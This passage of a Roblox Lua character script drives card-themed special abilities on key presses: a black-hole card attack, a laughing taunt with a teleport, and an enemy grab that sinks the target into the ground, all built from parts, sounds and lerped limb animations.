				vel.velocity = CFrame.new(locationpart.Position,torso.Position).lookVector*110
				removeuseless:AddItem(vel,.1)
			end
			coroutine.wrap(function()
				for i = 1, 90 do
					shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+12),0)
					shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(1.5,.1,1.5)
					shockwave.Transparency = shockwave.Transparency + 0.025
					shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+6),0)
					shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(1.25,.25,1.25)
					shockwave2.Transparency = shockwave2.Transparency + 0.04
					shockwave3.CFrame = shockwave3.CFrame * CFrame.Angles(0,math.rad(0+12),0)
					shockwavemesh3.Scale = shockwavemesh3.Scale + Vector3.new(.75,.75,.75)
					shockwave3.Transparency = shockwave3.Transparency + 0.035
					shockwave4.CFrame = shockwave3.CFrame * CFrame.Angles(0,math.rad(0+5),0)
					shockwavemesh4.Scale = shockwavemesh3.Scale + Vector3.new(2.5,.5,2.5)
					shockwave4.Transparency = shockwave3.Transparency + 0.03
					swait()
				end
			end)()
			SOUND(locationpart,765590102,6,false,2)
			for i = 1, 24 do
				bigcard.CFrame = bigcard.CFrame:lerp(Root.CFrame * CFrame.new(0,-3,-21) * CFrame.Angles(math.rad(90),0,0),.25)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(.2,.2,.2) * CFrame.Angles(0,0,0),.5)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1, 1.1, 0.4) * CFrame.Angles(math.rad(-75), math.rad(15), math.rad(4)), 0.5)
				swait()
			end
			for i = 1, 40 do
				bigcard.Transparency = bigcard.Transparency + 0.2
				acer.Transparency = acer.Transparency + .2
				ace2.Transparency = ace2.Transparency + .2
				swait()
			end
			attacking = false
			debounce = false
			appi = false
			clickdisallowance = false
			clickdebounce = false
			ws = 15
			bigcard:Remove()
			clean()
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='u' then
			if levitate then return end
			if mouse.Target ~= nil then end
			if debounce then return end
			debounce = true
			attacking = true
			appi = true
			ws = 15
			appi = true
			coroutine.wrap(function()
				while appi do
					wait()
					if Root.Velocity.y > 1 and attacking == true then
						position = "Jump2"
					elseif Root.Velocity.y < -1 and attacking == true then
						position = "Falling2"
					elseif Root.Velocity.Magnitude < 2 and attacking == true then
						position = "Idle2"
					elseif Root.Velocity.Magnitude > 2 and attacking == true then
						position = "Walking2"
					end
				end
			end)()
			coroutine.wrap(function()
				while appi do
					wait()
					settime = 0.05
					sine = sine + change
					if position == "Jump2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(-3),math.rad(-4)), 0.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
					elseif position == "Falling2" and attacking == true and appi == true then
						change = 1
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
					elseif position == "Idle2" and attacking == true and appi == true then
						change = .4
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
					elseif position == "Walking2" and attacking == true and appi == true then
						change = .8
						LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
						RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
						RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
						LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
					end
				end
			end)()
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
			for i = 1, 15 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
				RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
				swait()
			end
			cardportal = Instance.new("Part", Torso)
			cardportal.Size = Vector3.new(0.5, 0.5, 0.5)
			cardportal.Material = "Neon"
			cardportal.BrickColor = BrickColor.new("White")
			cardportal.Transparency = 0
			cardportal.Anchored = true
			cardportal.CanCollide = false
			cardportalMESH = Instance.new("SpecialMesh", cardportal)
			cardportalMESH.MeshType = "Cylinder"
			cardportalMESH.Scale = Vector3.new(.2,0.01,0.01)
			cardportal.CFrame = CFrame.new(mouse.Hit.p) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(90))
			for i = 1, 10 do
				cardportalMESH.Scale = cardportalMESH.Scale + Vector3.new(0,4,4)
				swait()
			end
			bigzcard = Instance.new("Part",Torso)
			bigzcard.Material = "Neon"
			bigzcard.Transparency = 0
			bigzcard.BrickColor = BrickColor.new("White")
			bigzcard.Size = Vector3.new(10, 15, 0.3)
			bigzcard.CFrame = cardportal.CFrame * CFrame.new(-8,0,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(90))
			bigzcard.Anchored = true
			SOUND(bigzcard,1888686669,6,false,1)
			acer = Instance.new("Decal",bigzcard)
			acer.Texture = "rbxassetid://1881287656"
			acer.Transparency = 0
			acer.Face = "Front"
			ace2 = acer:Clone()
			ace2.Parent = bigzcard
			ace2.Face = "Back"
			spinning = true
			coroutine.wrap(function()
				while spinning do
					bigzcard.CFrame = bigzcard.CFrame * CFrame.Angles(0,math.rad(0+5),0)
					swait()
				end
			end)()
			for i = 1, 20 do
				bigzcard.CFrame = bigzcard.CFrame * CFrame.new(0,-.9,0)
				swait()
			end
			coroutine.wrap(function()
				for i = 1, 10 do
					cardportalMESH.Scale = cardportalMESH.Scale - Vector3.new(0,4,4)
					swait()
				end
				cardportal:Remove()
			end)()
			wait(.7)
			ace3 = Instance.new("Decal",bigzcard)
			ace3.Texture = "rbxassetid://1880203893"
			ace3.Transparency = 1
			ace3.Face = "Front"
			ace4 = ace3:Clone()
			ace4.Parent = bigzcard
			ace4.Face = "Back"
			bigzcard2 = Instance.new("Part",Torso)
			bigzcard2.Material = "Neon"
			bigzcard2.Transparency = 1
			bigzcard2.BrickColor = BrickColor.new("Really black")
			bigzcard2.Size = Vector3.new(10, 15, 0.29)
			bigzcard2.CFrame = bigzcard.CFrame
			bigzcard2.CanCollide = false
			bigzcard2.Anchored = true
			coroutine.wrap(function()
				while spinning do
					bigzcard2.CFrame = bigzcard2.CFrame * CFrame.Angles(0,math.rad(0+5),0)
					swait()
				end
			end)()
			blz = bl[math.random(1,#bl)]
			woos = Instance.new("Sound",Torso)
			woos.SoundId = "rbxassetid://"..blz
			woos.Volume = 4
			woos:Play()
			for i = 1, 20 do
				bigzcard2.Transparency = bigzcard2.Transparency - .05
				bigzcard.Transparency = bigzcard.Transparency + .05
				ace3.Transparency = ace3.Transparency - 0.05
				ace4.Transparency = ace4.Transparency - 0.05
				acer.Transparency = acer.Transparency + 0.05
				ace2.Transparency = ace2.Transparency + 0.05
				wait()
			end
			ace3.Parent = bigzcard2
			ace3.Face = "Front"
			ace4.Parent = bigzcard2
			ace4.Face = "Back"
			bigzcard:Remove()
			spinning = false
			blackholeactive = true
			coroutine.wrap(function()
				blackhole={}
				orbzfade={}
				for i = 1, 100 do
					orbz = Instance.new("Part", Torso)
					orbz.Shape = "Ball"
					orbz.Material = "Neon"
					orbz.BrickColor = BrickColor.new("Really black")
					orbz.Size = Vector3.new(2,2,2)
					orbz.Anchored = true
					orbz.CanCollide = false
					removeuseless:AddItem(orbz,1)
					orbz.CFrame = bigzcard2.CFrame * CFrame.new(math.random(-25,25),math.random(-25,25),math.random(-25,25)) * CFrame.Angles(math.rad(-180,180),math.rad(-180,180),math.rad(-180,180))
					table.insert(blackhole,orbz)
					table.insert(orbzfade,orbz)
					for i,v in pairs(blackhole) do
						v.CFrame = v.CFrame:lerp(CFrame.new(bigzcard2.Position),.05)
					end
					for i,v in pairs(orbzfade) do
						v.Transparency = v.Transparency + 0.025
					end
					swait()
				end
			end)()
			coroutine.wrap(function()
				while blackholeactive do
					local Hit = damagealll(45,bigzcard2.Position)		
					for _,v in pairs(Hit) do
						coroutine.wrap(function()
							wait(.15)
							if blackholeactive == false then return end
							v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
						end)()		
						torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
						torso.CFrame = torso.CFrame:lerp(CFrame.new(bigzcard2.Position),.1)
					end
					wait()
				end
			end)()
			for i = 1, 100 do
				bigzcard2.CFrame = bigzcard2.CFrame * CFrame.Angles(0,math.rad(0+20),0)
				cataclysmics = Instance.new("Part", Torso)
				cataclysmics.Shape = "Ball"
				cataclysmics.Material = "Neon"
				cataclysmics.BrickColor = BrickColor.new("Really black")
				cataclysmics.Size = Vector3.new(11,11,11)
				cataclysmics.Transparency = .3
				cataclysmics.Anchored = true
				cataclysmics.CanCollide = false
				cataclysmics.CFrame = CFrame.new(bigzcard2.Position)
				table.insert(LessSize,cataclysmics)
				table.insert(keyYtransparency,cataclysmics)
				removeuseless:AddItem(cataclysmics,1)
				swait()
			end
			coroutine.wrap(function()
				for i = 1, 20 do
					for i,v in pairs(orbzfade) do
						v.Transparency = v.Transparency + 0.05
					end
					swait()
				end
			end)()
			explosiontable={}
			ringtable={}
			ringtable2={}
			soundboks = Instance.new("Part",Torso)
			soundboks.CanCollide = false
			soundboks.Anchored = true
			soundboks.Transparency = 1
			soundboks.CFrame = bigzcard2.CFrame
			removeuseless:AddItem(soundboks,6)
			SOUND(soundboks,472579737,6,false,1)
			blackholeactive = false
			bigzcard2:Remove()
			Hit = damagealll(60,soundboks.Position)
			for _,v in pairs(Hit) do			
				v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
				vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
				vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
				torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
				vel.velocity = CFrame.new(soundboks.Position,torso.Position).lookVector*200
				removeuseless:AddItem(vel,.1)
			end
			coroutine.wrap(function()
				shockwave = Instance.new("Part", Torso)
				shockwave.Size = Vector3.new(1,1,1)
				shockwave.CanCollide = false
				shockwave.Anchored = true
				shockwave.Transparency = 0
				shockwave.BrickColor = BrickColor.new("Really black")
				shockwave.CFrame = CFrame.new(soundboks.Position) * CFrame.new(0,-6,0)
				shockwavemesh = Instance.new("SpecialMesh", shockwave)
				shockwavemesh.Scale = Vector3.new(5,2,5)
				shockwavemesh.MeshId = "rbxassetid://20329976"
				shockwave2 = Instance.new("Part", Torso)
				shockwave2.Size = Vector3.new(1,1,1)
				shockwave2.CanCollide = false
				shockwave2.Anchored = true
				shockwave2.Transparency = 0
				shockwave2.BrickColor = BrickColor.new("Really black")
				shockwave2.CFrame = CFrame.new(soundboks.Position) * CFrame.new(0,-6,0)
				shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
				shockwavemesh2.Scale = Vector3.new(5,2,5)
				shockwavemesh2.MeshId = "rbxassetid://20329976"
				for i = 1, 40 do
					shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+15),0)
					shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+8),0)
					shockwave.Transparency = shockwave.Transparency + 0.025
					shockwave2.Transparency = shockwave2.Transparency + 0.025
					shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(9,.9,9)
					shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(8,.8,8)
					swait()
				end
				shockwave:Remove()
				shockwave2:Remove()
			end)()	
			for i = 1, 4 do
				explosion = Instance.new("Part", Torso)
				explosion.Shape = "Ball"
				explosion.Size = Vector3.new(1,1,1)
				explosion.Transparency = 0
				explosion.CanCollide = false
				explosion.Anchored = true
				explosion.BrickColor = BrickColor.new("Really black")
				explosion.Material = "Neon"
				explosion.CFrame = CFrame.new(bigzcard2.Position)
				table.insert(ExtremeM,explosion)
				table.insert(SlowlyFade,explosion)
				removeuseless:AddItem(explosion,4)
				ring = Instance.new("Part", Torso)
				ring.Size = Vector3.new(5, 5, 5)
				ring.Transparency = 0
				ring.BrickColor = BrickColor.new("Really black")
				ring.Anchored = true
				ring.CanCollide = false
				ring.CFrame = bigzcard2.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
				ringh = Instance.new("SpecialMesh", ring) 
				ringh.MeshId = "http://www.roblox.com/asset/?id=3270017" 
				ringh.Scale = Vector3.new(2, 2, .1)
				table.insert(keyYsize,ringh)
				table.insert(keyYtransparency,ring)
				removeuseless:AddItem(ring,4)
				swait()
			end
			wait(1.2)
			clean()
			keyYsize={}
			keyYtransparency={}
			blackholev = false
			appi = false
			g1:Remove()
			ws = 15
			attacking = false
			debounce = false
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='t' then
			if levitate then
				if tauntdebounce then return end
				tauntdebounce = true
				laughing = true
				coroutine.wrap(function()
					while laughing do
						local b1 = Instance.new("BillboardGui",Head)
						b1.Size = UDim2.new(0,4,0,1.6)
						b1.StudsOffset = Vector3.new(0,0,0)
						b1.Name = "laff"
						b1.AlwaysOnTop = true
						b1.Adornee = Head
						removeuseless:AddItem(b1,3)
						local b2 = Instance.new("TextLabel",b1)
						b2.BackgroundTransparency = 1
						b2.Text = "HaHaHaHaHaHa..."
						b2.Font = "Garamond"
						b2.TextSize = 0
						b2.Name = "lafftext"
						b2.TextStrokeTransparency = 0
						b2.TextColor3 = BrickColor.new("Really red").Color
						b2.TextStrokeColor3 = Color3.new(0,0,0)
						b2.Size = UDim2.new(1,0,.5,0)
						table.insert(laughingtable,b2)
						removeuseless:AddItem(b1,2)
						coroutine.wrap(function()
							if zxc then return end
							zxc = true
							while true do
								swait()
								for i,v in pairs(Head:GetChildren()) do
									if v.Name == "laff" then
										v.StudsOffset = v.StudsOffset + Vector3.new(math.random(-2,2),.3,math.random(-2,2))
									end
								end
								for i,v in pairs(laughingtable) do
									v.TextTransparency = v.TextTransparency + .025
									v.TextStrokeTransparency = v.TextStrokeTransparency + 0.25
									v.TextSize = v.TextSize + 2
									v.Rotation = v.Rotation + .1
								end
							end
						end)()
						swait(10)
					end
				end)()
				laugh = laughs[math.random(1,#laughs)]
				laughy = Instance.new("Sound",Head)
				laughy.SoundId = "rbxassetid://"..laugh
				laughy.Volume = 10
				laughy:Play()
				wait(1)
				wait(laughy.TimeLength)
				laughing = false
				laughy:Remove()
				tauntdebounce = false
			else
				if mouse.Target ~= nil then
					if debounce then return end
					attacking = true
					ghost()
					tps = Instance.new("Sound", Torso)
					tps.Volume = 5
					tps.SoundId = "rbxassetid://1894958339"
					tps:Play()
					removeuseless:AddItem(tps,2)
					g1 = Instance.new("BodyGyro", Root)
					g1.D = 175
					g1.P = 20000
					g1.MaxTorque = Vector3.new(0,9000,0)
					g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
					removeuseless:AddItem(g1,.05)
					Root.CFrame = CFrame.new(mouse.Hit.p) * CFrame.new(0,3.3,0)
					wait(.1)
					attacking = false
					debounce = false
				end
			end
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='q' then
			if levitate then return end
			if mouse.Target ~= nil and mouse.Target.Parent ~= Character and mouse.Target.Parent.Parent ~= Character and mouse.Target.Parent:FindFirstChildOfClass("Humanoid") ~= nil and mouse.Target.Parent:FindFirstChildOfClass("Humanoid").Health ~= 0 then
				if debounce then return end
				debounce = true
				attacking = true
				appi = true
				ws = 15
				coroutine.wrap(function()
					while appi do
						wait()
						if Root.Velocity.y > 1 and attacking == true then
							position = "Jump2"
						elseif Root.Velocity.y < -1 and attacking == true then
							position = "Falling2"
						elseif Root.Velocity.Magnitude < 2 and attacking == true then
							position = "Idle2"
						elseif Root.Velocity.Magnitude > 2 and attacking == true then
							position = "Walking2"
						end
					end
				end)()
				coroutine.wrap(function()
					while appi do
						wait()
						settime = 0.05
						sine = sine + change
						if position == "Jump2" and attacking == true and appi == true then
							change = 1
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
							ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
						elseif position == "Falling2" and attacking == true and appi == true then
							change = 1
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
						elseif position == "Idle2" and attacking == true and appi == true then
							change = .4
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
						elseif position == "Walking2" and attacking == true and appi == true then
							change = .8
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
							ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
						end
					end
				end)()
				enemyhum = mouse.Target.Parent:FindFirstChildOfClass("Humanoid")
				ETorso = enemyhum.Parent:FindFirstChild("Torso") or enemyhum.Parent:FindFirstChild("LowerTorso")
				EHead = enemyhum.Parent:FindFirstChild("Head")
				g1 = Instance.new("BodyGyro", Root)
				g1.D = 175
				g1.P = 20000
				g1.MaxTorque = Vector3.new(0,9000,0)
				brick = Instance.new("Part",Torso)
				brick.Anchored = true
				brick.CanCollide = false
				brick.Material = "Neon"
				brick.Transparency = 1
				brick.BrickColor = BrickColor.new("White")
				brick.Size = Vector3.new(8,.3,12)
				brick.CFrame = Root.CFrame * CFrame.new(math.random(-15,15),-3,math.random(-15,15))
				SOUND(brick,1888686669,6,false,1.5)
				ace = aces[math.random(1,#aces)]
				acer = Instance.new("Decal",brick)
				acer.Texture = "rbxassetid://1898092341"
				acer.Transparency = 1
				acer.Face = "Top"
				coroutine.wrap(function()
					for i = 1, 20 do
						g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
						brick.Transparency = brick.Transparency - .05
						acer.Transparency = acer.Transparency - .1
						swait()
					end
				end)()
				ETorso.Anchored = true
				EHead.Anchored = true
				for i = 1, 25 do
					swait()
					g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,-.2,0) * CFrame.Angles(0,0,0),.3)
					LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
					LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
					brick.CFrame = brick.CFrame:lerp(CFrame.new(ETorso.Position) * CFrame.new(0,-3,0) * CFrame.Angles(0,math.rad(0+10),0),.2)
				end
				SOUND(brick,472214107,6,false,2)
				coroutine.wrap(function()
					for i = 1, 10 do
						g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, .8, 0.4) * CFrame.Angles(math.rad(-60 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
						swait()
					end
				end)()
				shockwave = Instance.new("Part", Torso)
				shockwave.Size = Vector3.new(1,1,1)
				shockwave.CanCollide = false
				shockwave.Anchored = true
				shockwave.Transparency = 0
				shockwave.BrickColor = BrickColor.new("White")
				shockwave.CFrame = CFrame.new(brick.Position)
				shockwavemesh = Instance.new("SpecialMesh", shockwave)
				shockwavemesh.Scale = Vector3.new(1,1,1)
				shockwavemesh.MeshId = "rbxassetid://20329976"
				removeuseless:AddItem(shockwave,4)
				shockwave2 = Instance.new("Part", Torso)
				shockwave2.Size = Vector3.new(1,1,1)
				shockwave2.CanCollide = false
				shockwave2.Anchored = true
				shockwave2.Transparency = 0
				shockwave2.BrickColor = BrickColor.new("White")
				shockwave2.CFrame = CFrame.new(brick.Position)
				shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
				shockwavemesh2.Scale = Vector3.new(1,1,1)
				shockwavemesh2.MeshId = "rbxassetid://20329976"
				removeuseless:AddItem(shockwave2,4)
				for i = 1, 35 do
					swait()
					shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(2,.1,2)
					shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+12),0)
					shockwave.Transparency = shockwave.Transparency + .05
					shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(.5,.1,.5)
					shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+4),0)
					shockwave2.Transparency = shockwave2.Transparency + .03
					EHead.CFrame = EHead.CFrame * CFrame.new(0,-.20,0)
					ETorso.CFrame = ETorso.CFrame * CFrame.new(0,-.25,0)
				end
				for i = 1, 8 do
					brick.Size = brick.Size + Vector3.new(1.5,0,2.5)
					swait()
				end
				n = 0
				SOUND(brick,54111471,6,false,1)
				for i = 1, 40 do
					n = n + 6
					brick.Transparency = brick.Transparency + .025
					acer.Transparency = acer.Transparency + .075
					brick.CFrame = brick.CFrame * CFrame.Angles(0,math.rad(n),0)
